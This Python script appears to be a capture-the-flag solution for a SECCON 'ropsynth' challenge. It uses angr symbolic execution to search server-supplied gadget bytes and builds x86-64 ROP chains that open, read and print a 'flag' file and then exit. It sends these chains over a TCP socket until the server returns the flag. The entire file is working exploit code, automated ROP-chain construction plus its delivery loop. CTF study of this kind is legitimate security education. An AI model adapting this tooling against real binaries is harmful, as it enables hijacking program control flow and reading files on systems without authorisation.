#!/usr/bin/env python
import angr
import claripy
import sys
from IPython import embed
from simuvex import s_options
import logging
import pwn
import binascii

l = logging.getLogger("ropsynth")
l.setLevel(logging.INFO)
logging.getLogger("simuvex").setLevel(logging.CRITICAL)

BASEADDR_CODE = 0x00800000
BASEADDR_DATA = 0x00a00000

def get_symbuf(size):
    symbuf = []
    for cnt in range(size):
        symbuf.append(claripy.BVS("BUF_%08x"%cnt, 8, explicit_name=True))
    return symbuf

def get_initial_state(prj, symbuf):
    #state = prj.factory.entry_state()
    state = prj.factory.blank_state()
    for cnt, symchar in enumerate(symbuf):
        state.memory.store(state.regs.rsp+cnt, symchar, endness='Iend_LE')
    state.memory.store(BASEADDR_DATA, claripy.BVV("flag\0"))
    """
    state.regs.rax = claripy.BVV(0, 64)
    state.regs.rbp = claripy.BVV(0, 64)
    state.regs.rbx = claripy.BVV(0, 64)
    state.regs.rcx = claripy.BVV(0, 64)
    state.regs.rdi = claripy.BVV(0, 64)
    state.regs.rdx = claripy.BVV(0, 64)
    state.regs.rax = claripy.BVV(0, 64)
    state.regs.rsi = claripy.BVV(0, 64)
    state.regs.r8 = claripy.BVV(0, 64)
    state.regs.r9 = claripy.BVV(0, 64)
    state.regs.r10 = claripy.BVV(0, 64)
    state.regs.r11 = claripy.BVV(0, 64)
    state.regs.r12 = claripy.BVV(0, 64)
    state.regs.r13 = claripy.BVV(0, 64)
    state.regs.r14 = claripy.BVV(0, 64)
    state.regs.r15 = claripy.BVV(0, 64)
    """

    return state

def depends_only_on_buf(symvar, offset_limit):
    for v in symvar.variables:
        if v.startswith("BUF_") == False:
            return False
        """
        if int(v[4:], 16) >= offset_limit:
            return False
        """
    return True

def check_constraints(state):
    global orig_rsp
    offset_limit = state.se.any_int(state.regs.rsp - orig_rsp)
    for constraint in state.se.constraints:
        if depends_only_on_buf(constraint, offset_limit) == False:
            return False
    return True

def check_memory_access(path):
    global orig_rsp
    for action in path.actions:
        if action.type == 'mem':
            if action.addr.ast.symbolic:
                """
                if depends_only_on_buf(action.addr.ast, None):
                    continue
                """
                return False
            else:
                # TODO: check address
                addr = path.state.se.any_int(action.addr)
                if addr < orig_rsp or addr >= orig_rsp+4096:
                    l.info("addr:%x orig_rsp: %x" % (addr, orig_rsp))
                    return False
    return True


set_rax2rdi = "\x50\x5f"
pop_rdi = "\x5f"
pop_rax = "\x58"
syscall = "\x0f\x05"
pop_rbx = "\x5b"
pop_rsi = "\x5e"
set_rax2rdx = "\x50\x5a"
pop_rdx = "\x5a"

def findall(prj, target):
    image = "".join(prj.loader.main_bin.memory.read_bytes(0, 4096))
    offset_list = []
    offset = image.find(target)
    while offset >= 0:
        offset_list.append(offset)
        offset = image.find(target, offset+1)
    return offset_list

debug = 0
def find_gadget(prj, initial_state, insn_ptn, get_constraints,
                first_gadget=False, last_gadget=False):
    final_states = []
    candidates = []
    for offset in findall(prj, insn_ptn):
        #l.info("pattern found: %x" % offset)
        state = initial_state.copy()
        if first_gadget:
            state.add_constraints(
                state.memory.load(state.regs.rsp, endness='Iend_LE') == (BASEADDR_CODE+offset))
            state.regs.rsp += 8
        else:
            #print "rip:", state.regs.rip,
            #print "value:", BASEADDR_CODE+offset
            state.add_constraints(state.regs.rip == (BASEADDR_CODE+offset))
        pg = prj.factory.path_group(state, save_unconstrained=True)
        if insn_ptn == syscall:
            # dirty hack for syscall
            pg.step(addr=BASEADDR_CODE+offset+2)
        else:
            pg.step(addr=BASEADDR_CODE+offset)
        loopcnt=0
        while len(pg.active) > 0:
            pg.step()
            loopcnt += 1
            if loopcnt > 100:
                #raise Exception("loop limit")
                l.warn("loop limit")
                break
        if len(pg.unconstrained) == 0 and last_gadget == False:
            continue
        for upath in pg.unconstrained:
            if check_constraints(upath.state):
                candidates.append((upath, offset))
        if last_gadget:
            for dpath in pg.deadended:
                if check_constraints(dpath.state):
                    candidates.append((dpath, offset))

    for cand_path, cand_offset in candidates:
        rsp_delta = cand_path.state.se.any_int(cand_path.state.regs.rsp - initial_state.regs.rsp)
        if rsp_delta < 8 or rsp_delta > 256:
            l.info("rsp_delta limit")
            continue
        else:
            l.info("rsp_delta: %d" % rsp_delta)
        constraints = get_constraints(cand_path.state)
        if constraints != None:
            cand_path.state.add_constraints(constraints)
        if cand_path.state.satisfiable():
            if check_memory_access(cand_path):
                l.info("candidate offset: %x" % cand_offset)
                final_states.append(cand_path.state)

    l.info("len(final_states): %d" % len(final_states))
    if len(final_states) == 0:
        return None
    if len(final_states) > 1:
        l.info("multiple candidates exist")
    return final_states[0]
    #return final_states[-1]

orig_rsp = 0
def construct_ropchain(fname):
    global orig_rsp
    load_options={
        "main_opts": {
            "custom_arch": "AMD64",
            "backend": "blob",
            "custom_base_addr": BASEADDR_CODE,
            "custom_entry_point": 0,
        },
    }

    l.info("started")
    prj = angr.Project(
        fname, load_options=load_options, simos=angr.simos.SimLinux)
    # angr's bug? A blob project needs is_ppc64_abiv1.
    prj.loader.main_bin.is_ppc64_abiv1 = False
    symbuf = get_symbuf(4096)
    initial_state = get_initial_state(prj, symbuf)
    initial_state.options.add(s_options.BYPASS_UNSUPPORTED_SYSCALL)
    initial_state.options.add(s_options.NO_SYMBOLIC_SYSCALL_RESOLUTION)
    initial_state.options.add(s_options.AVOID_MULTIVALUED_READS)
    initial_state.options.add(s_options.AVOID_MULTIVALUED_WRITES)
    initial_state.options.add(s_options.TRACK_ACTION_HISTORY)

    state = initial_state
    orig_rsp = state.se.any_int(initial_state.regs.rsp)
    state = find_gadget(
        prj, state, pop_rdi, lambda s: s.regs.rdi == BASEADDR_DATA, True)
    state = find_gadget(prj, state, pop_rsi, lambda s: s.regs.rsi == 0)
    state = find_gadget(prj, state, pop_rdx, lambda s: s.regs.rdx == 0)
    state = find_gadget(prj, state, pop_rax, lambda s: s.regs.rax == 2)
    state = find_gadget(prj, state, syscall, lambda s: None)

    state = find_gadget(
        prj, state, set_rax2rdi, lambda s: state.regs.rax == s.regs.rdi)
    state = find_gadget(
        prj, state, pop_rsi, lambda s: s.regs.rsi == BASEADDR_DATA)
    state = find_gadget(prj, state, pop_rdx, lambda s: s.regs.rdx == 255)
    state = find_gadget(prj, state, pop_rax, lambda s: s.regs.rax == 0)
    state = find_gadget(prj, state, syscall, lambda s: None)

    state = find_gadget(prj, state, pop_rdi, lambda s: s.regs.rdi == 1)
    state = find_gadget(
        prj, state, pop_rsi, lambda s: s.regs.rsi == BASEADDR_DATA)
    state = find_gadget(
        prj, state, set_rax2rdx, lambda s: state.regs.rax == s.regs.rdx)
    state = find_gadget(prj, state, pop_rax, lambda s: s.regs.rax == 1)
    state = find_gadget(prj, state, syscall, lambda s: None)

    state = find_gadget(prj, state, pop_rdi, lambda s: s.regs.rdi == 0)
    state = find_gadget(prj, state, pop_rax, lambda s: s.regs.rax == 231)
    state = find_gadget(prj, state, syscall, lambda s: None, last_gadget=True)

    buf = ""
    for cnt in range(state.se.any_int(state.regs.rsp-orig_rsp)):
        buf += state.se.any_str(symbuf[cnt])

    l.info("finished")

    return buf

def main():
    sock = pwn.mktcp((sys.argv[1], int(sys.argv[2])))

    cnt = 0
    while True:
        gadgets_fname = "gadgets.%d" % cnt
        ropchain_fname = "ropchain.%d" % cnt
        banner = sock.recv_until("\n").strip()
        if banner.startswith("SECCON{"):
            break
        print banner
        encoded_gadgets = sock.recv_until("\n")
        gadgets = binascii.a2b_base64(encoded_gadgets)
        gadgets += '\xCC' * (4096-len(gadgets))
        open(gadgets_fname, "wb").write(gadgets)
        ropchain = construct_ropchain(gadgets_fname)
        ropchain += '\xFF' * (4096-len(ropchain))
        open(ropchain_fname, "wb").write(ropchain)
        sock.send(binascii.b2a_base64(ropchain))
        result = sock.recv_until("\n").strip()
        if result != "OK":
            print result
            break
        print result
        cnt += 1
    print banner


if __name__ == '__main__':
    main()
